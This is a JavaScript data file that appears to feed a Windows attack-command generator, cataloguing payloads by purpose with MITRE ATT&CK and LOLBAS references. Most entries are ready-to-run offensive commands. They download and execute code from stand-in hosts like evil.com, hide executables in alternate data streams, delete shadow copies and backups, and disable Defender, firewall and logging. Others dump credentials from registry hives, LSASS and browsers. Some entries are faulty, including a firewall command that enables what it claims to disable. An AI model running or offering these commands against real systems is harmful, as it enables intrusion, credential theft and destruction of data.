/**
 * All payloads are stored here. This data is used for generating payloads from the options selected by users.
 * 
 * Schema:
 * {
 *      Purpose: {
 *          Binary: {
 *              Command: String,
 *              Cli: String?,
 *              AdminRequired: Bool,
 *              MitreAtt&ck: {
 *                  ID: String,
 *                  URL: String,
 *              }?,
 *              LOLBAS: String?,
 *              Description: String?,
 *          }
 *      }
 * }
 */
const PAYLOADS = {
    'Alternate Data Streams': {
        'Certutil': {
            'cmd': 'certutil -urlcache -split -f https://evil.com/evil.exe .\\file.txt:test.exe',
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/',
            'desc': 'The command embeds the external evil.exe into the file.txt. The file.txt must already exist on the system. To execute it, run \'.\\file.txt:test.exe\' command.'
        },
        'Echo (regsvr32.exe)': {
            'cmd': 'cmd /c "echo regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll > file.docx:payload.bat"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Cmd/',
            'desc': 'The command writes the code "regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll" to the "payload.bat" and embed it into the "file.docx". The "file.docx" must already exist in the system.',
        },
        'Echo (GetObject)': {
            'cmd': 'cmd /c "echo GetObject(\'script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js\') > .\\file.txt:calc.js"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': null,
            'desc': 'The command downloads and embeds a JavaScript file to arbitrary file (e.g. \'file.txt\'). The file.txt must already exist on the system.',
        },
        'Type': {
            'cmd': 'cmd /c "type .\\evil.exe > .\\file.txt:test.exe"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': null,
            'desc': 'The command embeds the evil.exe into the file.txt. The file.txt must already exist on the system. To execute it, run \'.\\file.txt:test.exe\' command.',
        },
    },
    'Archive': {
        'Makecab': {
            'cmd': 'makecab data.txt data.cab',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1560.001', 'url': 'https://attack.mitre.org/techniques/T1560/001/'},
            'lolbas': null,
            'desc': 'The command compresses the file. To decompress it, execute \'expand data.cab\' command.',
        },
        'PowerShell (Compress-Archive)': {
            'cmd': 'Compress-Archive -Path data.txt -DestinationPath data.zip -Force',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1560', 'url': 'https://attack.mitre.org/techniques/T1560/'},
            'lolbas': null,
            'desc': null,
        },
        'tar': {
            'cmd': 'tar -czvf data.tar.gz data.txt',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1560', 'url': 'https://attack.mitre.org/techniques/T1560/'},
            'lolbas': null,
            'desc': null,
        },
    },
    'Bypass MOTW': {
        'PowerShell (Unblock-File)': {
            'cmd': 'Unblock-File -Path evil.exe',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1553.005', 'url': 'https://attack.mitre.org/techniques/T1553/005/'},
            'lolbas': null,
            'desc': 'The command deletes Alternate Data Stream named \'Zone.Identifier\' from the file to bypass Mark-of-the-Web.',
        },
    },
    'Clear Event Logs': {
        'PowerShell (Remove-EventLog)': {
            'cmd': 'Remove-EventLog -LogName System;Remove-EventLog -LogName Application;Remove-EventLog -LogName Security',
            'cli': 'PowerShell',
            'adminRequired': true,
            'mitre': {'id': 'T1070.001', 'url': 'https://attack.mitre.org/techniques/T1070/001/'},
            'lolbas': null,
            'desc': null,
        },
        'Wevtutil': {
            'cmd': 'wevtutil cl system;wevtutil cl application;wevtutil cl security',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1070.001', 'url': 'https://attack.mitre.org/techniques/T1070/001/'},
            'lolbas': null,
            'desc': null,
        },
    },
    'Copy': {
        'Bitsadmin': {
            'cmd': 'bitsadmin /CREATE 1;bitsadmin /ADDFILE 1 C:\\Windows\\System32\\calc.exe C:\\calc.exe;bitsadmin /RESUME 1;bitsadmin /COMPLETE 1;bitsadmin /RESET',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/',
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'Esentutl': {
            'cmd': 'esentutl /y .\\file.txt /d .\\file_copied.txt /o',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Esentutl/',
            'desc': null,
        },
        'Wmic': {
            'cmd': 'wmic datafile where "Name=\'C:\\Windows\\System32\\calc.exe\'" call Copy "C:\\calc.exe"',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
            'desc': null,
        }
    },
    'Delete Backups & Shadow Copies': {
        'Bcdedit': {
            'cmd': 'bcdedit /set {default} bootstatuspolicy ignoreallfailures;bcdedit /set {default} recoveryenabled no',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'Diskshadow': {
            'cmd': 'diskshadow delete shadows all',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': 'The command deletes shadow copies.',
        },
        'PowerShell (Get-WmiObject)': {
            'cmd': 'Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}',
            'cli': 'PowerShell',
            'adminRequired': true,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': 'The command deletes shadow copies.',
        },
        'Vssadmin': {
            'cmd': 'vssadmin delete shadows /all /quiet',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': 'The command deletes shadow copies.',
        },
        'Wbadmin': {
            'cmd': 'wbadmin delete backup',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': 'The command deletes backups.',
        },
        'Wbadmin (Catalog)': {
            'cmd': 'wbadmin delete catalog -quiet',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': 'The command erases Windows Backup Catalog.',
        },
        'Wmic': {
            'cmd': 'wmic shadowcopy delete',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1490', 'url': 'https://attack.mitre.org/techniques/T1490/'},
            'lolbas': null,
            'desc': 'The command deletes shadow copies.',
        },
    },
    'Delete Files': {
        'Sdelete': {
            'cmd': 'sdelete -p 3 .\\example.txt',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1485', 'url': 'https://attack.mitre.org/techniques/T1485/'},
            'lolbas': null,
            'desc': 'The command securely deletes a file. The deleted file cannot be recovered.',
        },
    },
    'Disable AV/EDR': {
        'bcdedit': {
            'cmd': 'bcdedit /set safeboot network',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1562.009', 'url': 'https://attack.mitre.org/techniques/T1562/009/'},
            'lolbas': null,
            'desc': null,
        },
        'PowerShell (Set-MpPreference)': {
            'cmd': 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableArchiveScanning $true',
            'cli': 'PowerShell',
            'adminRequired': true,
            'mitre': {'id': 'T1562.001', 'url': 'https://attack.mitre.org/techniques/T1562/001/'},
            'lolbas': null,
            'desc': 'The command disables each feature of Windows Defender. To restore them, set \'$false\' for each option.',
        },
    },
    'Disable Command Logging': {
        'PowerShell': {
            'cmd': 'Set-PSReadlineOption -HistorySaveStyle SaveNothing;Remove-Item (Get-PSReadlineOption).HistorySavePath',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1562.003', 'url': 'https://attack.mitre.org/techniques/T1562/003/'},
            'lolbas': null,
            'desc': 'The command avoids storing PowerShell command history anywhere, and removes the history file.',
        },
        'Reg': {
            'cmd': 'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1562.003', 'url': 'https://attack.mitre.org/techniques/T1562/003/'},
            'lolbas': null,
            'desc': 'The command disables command line auditing. To enable it, set 1 to the value.',
        },
    },
    'Disable Event Logging': {
        'PowerShell (Stop-Service)': {
            'cmd': 'Stop-Service -Name EventLog -Force',
            'cli': 'PowerShell',
            'adminRequired': true,
            'mitre': {'id': 'T1562.002', 'url': 'https://attack.mitre.org/techniques/T1562/002/'},
            'lolbas': null,
            'desc': 'The command stops the EventLog service. To restart it, run \'Start-Service -Name EventLog\' command.',
        },
        'Reg (System)': {
            'cmd': 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System /v Start /t REG_DWORD /d 0 /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1562.002', 'url': 'https://attack.mitre.org/techniques/T1562/002/'},
            'lolbas': null,
            'desc': 'The command sets 0 to the Start value for disabling System EventLog. We must reboot the system to apply this change. To restore it, set 1 to the Start value.'
        },
        'Reg (Application)': {
            'cmd': 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application /v Start /t REG_DWORD /d 0 /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1562.002', 'url': 'https://attack.mitre.org/techniques/T1562/002/'},
            'lolbas': null,
            'desc': 'The command sets 0 to the Start value for disabling All EventLogs. We must reboot the ssytem to apply this change. To restore it, set 1 to the Start value.'
        },
    },
    'Disable Firewall': {
        'Netsh': {
            'cmd': 'netsh advfirewall set currentprofile state on',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1562.004', 'url': 'https://attack.mitre.org/techniques/T1562/004/'},
            'lolbas': null,
            'desc': 'The command disables Windows Defender Firewall. To enable it, set \'state off\' in the above command.',
        },
        'Reg': {
            'cmd': 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile /v "EnableFirewall" /t REG_DWARD /d 0 /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1562.004', 'url': 'https://attack.mitre.org/techniques/T1562/004/'},
            'lolbas': null,
            'desc': 'The command disables Windows Defender Firewall. To enable it, set \'/d 1\' in the following command.',
        },
    },
    'Download': {
        'Bitsadmin': {
            'cmd': 'bitsadmin /transfer /download /priority foreground https://evil.com/evil.exe C:\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1197', 'url': 'https://attack.mitre.org/techniques/T1197/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/',
            'desc': null,
        },
        'Certutil': {
            'cmd': 'certutil -urlcache -split -f http://example.com/evil.exe .\\evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/',
            'desc': null,
        },
        'PowerShell (DownloadFile)': {
            'cmd': '(New-Object System.Net.WebClient).DownloadFile("https://evil.com/evil.exe", "C:\\evil.exe")',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': '', 'url': ''},
            'lolbas': null,
            'desc': null,
        },
        'PowerShell (Invoke-WebRequest)': {
            'cmd': 'iwr -uri http://example.com/evil.exe -outfile .\\evil.exe',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, call "powershell" before the command such as "powershell -nop iwr -uri ...".',
        },
        'PowerShell (Start-BitsTransfer)': {
            'cmd': 'Start-BitsTransfer -Priority foreground -Source https://evil.com/evil.exe -Destination evil.exe',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1197', 'url': 'https://attack.mitre.org/techniques/T1197/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, call "powershell" before the command such as "powershell -nop Start-BitsTransfer ...".',
        },
        'Mshta': {
            'cmd': 'mshta https://evil.com/evil.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
            'desc': null,
        },
    },
    'Download & Execute': {
        'PowerShell (iex)': {
            'cmd': 'iex((New-Object Net.WebClient).DownloadString("https://10.0.0.1/evil.ps1"))',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': null,
            'desc': 'If you run it on Commnad Prompt, call "powershell" before the command such as "powershell -nop -c \"IEX((...".',
        },
        'PowerShell (iex, proxy)': {
            'cmd': '$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;iex $($w.DownloadString("https://evil.com/evil.ps1"))',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
            'lolbas': null,
            'desc': null,
        },
    },
    'Dump Credentials': {
        'Esentutl': {
            'cmd': 'esentutl /y /vss C:\\Windows\\System32\\config\\SECURITY /d .\\security.bak;esentutl /y /vss C:\\Windows\\System32\\config\\SYSTEM /d .\\system.bak;esentutl /y /vss C:\\Windows\\System32\\config\\SAM /d .\\sam.bak',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1003.002', 'url': 'https://attack.mitre.org/techniques/T1003/002/'},
            'lolbas': null,
            'desc': 'The command copies the registry hives to each file using Volume Shadow Copies (vss).',
        },
        'PowerShell (WinPwn)': {
            'cmd': 'iex(New-Object Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1\');Kittielocal -noninteractive -browsercredentials',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1555.003', 'url': 'https://attack.mitre.org/techniques/T1555/003/'},
            'lolbas': null,
            'desc': 'The command imports the WinPwn module and dumps credentials from web browsers.',
        },
        'Psexec': {
            'cmd': 'psexec -accepteula -s reg save HKLM\\Security\\Policy\\Secrets C:\\secrets /y',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1003.004', 'url': 'https://attack.mitre.org/techniques/T1003/004/'},
            'lolbas': null,
            'desc': 'The command saves the LSA secrets to arbitrary file. The file can be extracted using some tool such as Mimikatz.',
        },
        'Reg (Find Credentials)': {
            'cmd': 'reg query HKLM /f password /t REG_SZ /s',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1552.002', 'url': 'https://attack.mitre.org/techniques/T1552/002/'},
            'lolbas': null,
            'desc': 'The command enumerates entries in Registry that contain the "password" string.',
        },
        'Reg (Save hives)': {
            'cmd': 'reg save HKLM\\SECURITY .\\security.bak;reg save HKLM\\SYSTEM .\\system.bak;reg save HKLM\\SAM .\\sam.bak',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1003.002', 'url': 'https://attack.mitre.org/techniques/T1003/002/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Reg/',
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'Reg (WDigest)': {
            'cmd': 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1112', 'url': 'https://attack.mitre.org/techniques/T1112/'},
            'lolbas': null,
            'desc': 'The command enables to store plaintext passwords. These passwords can be extracted using the Mimikatz \'sekurlsa::wdigest\' command. To disable it, set 0 with \'reg add\' command.',
        },
        'Rundll32': {
            'cmd': 'rundll32 C:\\Windows\\System32\\comsvcs.dll,MiniDump <LSASS_PID> C:\\lsass.dmp full',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
            'desc': 'Replace \'<LSASS_PID>\' with actual PID of "lsass.exe". To find it, use \'Get-Process\' or \'tasklist\' command.',
        },
        'Vaultcmd': {
            'cmd': 'vaultcmd /listcreds:"Windows Credentials" /all',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1555', 'url': 'https://attack.mitre.org/techniques/T1555/'},
            'lolbas': null,
            'desc': null,
        },
    },
    'Enumerate Accounts': {
        'Dsquery (computer)': {
            'cmd': 'dsquery computer -name *',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1087.002', 'url': 'https://attack.mitre.org/techniques/T1087/002/'},
            'lolbas': null,
            'desc': 'The command enumerates all computer accounts in Active Directory.',
        },
        'Dsquery (group)': {
            'cmd': 'dsquery group -name *',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1087.002', 'url': 'https://attack.mitre.org/techniques/T1087/002/'},
            'lolbas': null,
            'desc': 'The command enumerates all groups in Active Directory.',
        },
        'Dsquery (user)': {
            'cmd': 'dsquery user -name *',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1087.002', 'url': 'https://attack.mitre.org/techniques/T1087/002/'},
            'lolbas': null,
            'desc': 'The command enumerates all users in Active Directory.',
        },
        'Net (group, domain)': {
            'cmd': 'net group /domain',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1087.002', 'url': 'https://attack.mitre.org/techniques/T1087/002/'},
            'lolbas': null,
            'desc': 'The command enumerates domain groups.',
        },
        'Net (localgroup)': {
            'cmd': 'net localgroup',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The command enumerates local groups.',
        },
        'Net (user)': {
            'cmd': 'net user',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The commnad enumerates local user accounts.',
        },
        'Net (user, domain)': {
            'cmd': 'net user /domain',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The command enumerates domain user accounts.',
        },
        'PowerShell (Get-ADComputer)': {
            'cmd': 'Get-ADComputer -Filter *',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The command enumerates all computer accounts in Active Directory.',
        },
        'PowerShell (Get-ADUser)': {
            'cmd': 'Get-ADUser -Filter *',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The command enumerates all users in Active Directory.',
        },
        'PowerShell (Get-LocalUser)': {
            'cmd': 'Get-LocalUser',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The command enumerates local user accounts.',
        },
        'PowerShell (Get-LocalGroup)': {
            'cmd': 'Get-LocalGroup',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The command enumerates local groups.',
        },
        'PowerShell (Get-WmiObject)': {
            'cmd': 'Get-WmiObject Win32_Group',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1069.001', 'url': 'https://attack.mitre.org/techniques/T1069/001/'},
            'lolbas': null,
            'desc': 'The command enumerates local groups.',
        },
        'Wmic (useraccount)': {
            'cmd': 'wmic useraccount get /ALL',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
            'lolbas': null,
            'desc': 'The command enumerates detailed information of local user accounts. If you find the output difficult to see, try adding the \'/format:csv\' option.',
        },
    },
    'Enumerate Backups': {
        'Vssadmin (shadows)': {
            'cmd': 'vssadmin list shadows',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates shadow copies.',
        },
        'Vssadmin (volumes)': {
            'cmd': 'vssadmin list volumes',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates volumes.',
        },
    },
    'Enumerate Event Logs': {
        'PowerShell (Get-EventLog)': {
            'cmd': 'Get-EventLog security -InstanceId 4624 -Newest 10',
            'cli': 'PowerShell',
            'adminRequired': true,
            'mitre': {'id': 'T1654', 'url': 'https://attack.mitre.org/techniques/T1654/'},
            'lolbas': null,
            'desc': 'The command enumerates successful logon events.',
        },
        'Wevtutil': {
            'cmd': 'wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text /c:10',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': '', 'url': ''},
            'lolbas': null,
            'desc': 'The command enumerates successful logon events.'
        },
    },
    'Enumerate Networks': {
        'Arp': {
            'cmd': 'arp -a',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates network adapter and interface information.',
        },
        'Ipconfig': {
            'cmd': 'ipconfig /all',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates IP addresses in the local network.',
        },
        'Nbtstat': {
            'cmd': 'nbtstat -n',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates NetBIOS names and IP addresses.',
        },
        'Net (config)': {
            'cmd': 'net config workstation',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': '', 'url': ''},
            'lolbas': null,
            'desc': 'The command enumerates network configuration information.',
        },
        'Net (share)': {
            'cmd': 'net share',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1135', 'url': 'https://attack.mitre.org/techniques/T1135/'},
            'lolbas': null,
            'desc': 'The command enumerates shared drives on the local system.'
        },
        'Net (view)': {
            'cmd': 'new view \\\\RemoteComputer',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1135', 'url': 'https://attack.mitre.org/techniques/T1135/'},
            'lolbas': null,
            'desc': 'The command enumerates network shared directories on the specified network. Replace the \'RemoteComputer\' with the remote system such as a computer name or an IP address.',
        },
        'Netsh (advfirewall)': {
            'cmd': 'netsh advfirewall firewall show rule name=all',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates the Firewall rules.',
        },
        'Netsh (interface)': {
            'cmd': 'netsh interface show interface',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates network interface information and status.',
        },
        'Netsh (wlan)': {
            'cmd': 'netsh wlan show profile * key=clear',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016.002', 'url': 'https://attack.mitre.org/techniques/T1016/002/'},
            'lolbas': null,
            'desc': 'The command enumerates the information of Wi-Fi networks that has been previously connected, and corresponding passwords.',
        },
        'Netstat': {
            'cmd': 'netstat -ano',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1049', 'url': 'https://attack.mitre.org/techniques/T1049/'},
            'lolbas': null,
            'desc': 'The command enumerates network connections.',
        },
        'PowerShell (Get-NetAdapter)': {
            'cmd': 'Get-NetAdapter',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
            'lolbas': null,
            'desc': 'The command enumerates network adapter information.',
        },
        'PowerShell (Get-NetFirewallRule)': {
            'cmd': 'Get-NetFirewallRule',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1562.004', 'url': 'https://attack.mitre.org/techniques/T1562/004/'},
            'lolbas': null,
            'desc': 'The command enumerates firewall rules.',
        },
        'PowerShell (Get-NetIPConfiguration': {
            'cmd': 'Get-NetIPConfiguration',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates network configurations.',
        },
        'PowerShell (Get-SmbShare)': {
            'cmd': 'Get-SmbShare',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1135', 'url': 'https://attack.mitre.org/techniques/T1135/'},
            'lolbas': null,
            'desc': 'The command enumerates network shared directories.',
        },
        'Route': {
            'cmd': 'route print',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command enumerates network adapter and interface information.',
        },
        'Tcpvcon': {
            'cmd': 'tcpvcon -a',
            'cli': null,
            'adminRequired': false,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command enumerates all TCP connections for each process.',
        },
        'Type (hosts)': {
            'cmd': 'type C:\\Windows\\System32\\drivers\\etc\\hosts',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
            'lolbas': null,
            'desc': 'The command displays the contents of the HOSTS file that contains network configurations.',
        },
    },
    'Enumerate Processes': {
        'PowerShell (Get-CimInstance)': {
            'cmd': 'Get-CimInstance -Query \'Select * from Win32_Process\'',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1057', 'url': 'https://attack.mitre.org/techniques/T1057/'},
            'lolbas': null,
            'desc': 'The command enumerates running processes.'
        },
        'PowerShell (Get-Process)': {
            'cmd': 'Get-Process',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1057', 'url': 'https://attack.mitre.org/techniques/T1057/'},
            'lolbas': null,
            'desc': 'The command enumerates running processes.'
        },
        'PowerShell (Get-WmiObject)': {
            'cmd': 'Get-WmiObject -Class Win32_Process',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1057', 'url': 'https://attack.mitre.org/techniques/T1057/'},
            'lolbas': null,
            'desc': 'The command enumerates running processes.',
        },
        'Tasklist': {
            'cmd': 'tasklist',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1057', 'url': 'https://attack.mitre.org/techniques/T1057/'},
            'lolbas': null,
            'desc': 'The command enumerates running processes.',
        },
        'Wmic': {
            'cmd': 'wmic process get caption,executablepath,commandline,processid /format:csv',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1057', 'url': 'https://attack.mitre.org/techniques/T1057/'},
            'lolbas': null,
            'desc': 'The command enumerates running processes.',
        },
    },
    'Enumerate Services': {
        'Net': {
            'cmd': 'net start',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1007', 'url': 'https://attack.mitre.org/techniques/T1007/'},
            'lolbas': null,
            'desc': 'The command enumerates started services.',
        },
        'PowerShell (Get-Service)': {
            'cmd': 'Get-Service | Where-Object {$_.Status -eq "Running"}',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1007', 'url': 'https://attack.mitre.org/techniques/T1007/'},
            'lolbas': null,
            'desc': 'The command enumerates running services.',
        },
        'Psservice': {
            'cmd': 'psservice query -s active',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1007', 'url': 'https://attack.mitre.org/techniques/T1007/'},
            'lolbas': null,
            'desc': 'The command enumerates running services.',
        },
        'Sc': {
            'cmd': 'sc.exe query',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1007', 'url': 'https://attack.mitre.org/techniques/T1007/'},
            'lolbas': null,
            'desc': 'The command enumerates system services.',
        },
        'Wmic': {
            'cmd': 'wmic service list brief',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1007', 'url': 'https://attack.mitre.org/techniques/T1007/'},
            'lolbas': null,
            'desc': 'The command enumerates services.',
        },
    },
